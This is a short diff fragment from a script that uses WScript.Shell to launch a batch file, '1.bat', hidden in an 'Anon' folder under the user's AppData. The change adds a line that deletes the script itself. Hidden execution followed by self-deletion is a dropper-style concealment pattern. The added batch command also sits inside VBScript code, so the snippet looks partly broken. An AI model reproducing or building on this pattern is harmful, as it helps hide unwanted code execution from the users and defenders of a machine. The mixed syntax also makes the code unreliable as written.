@@ -29,3 +29,5 @@ del .zip
 
 Set WShShell = WScript.CreateObject("WScript.Shell")
 WShShell.Run "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat", 0
+
+del "%~f0" & exit
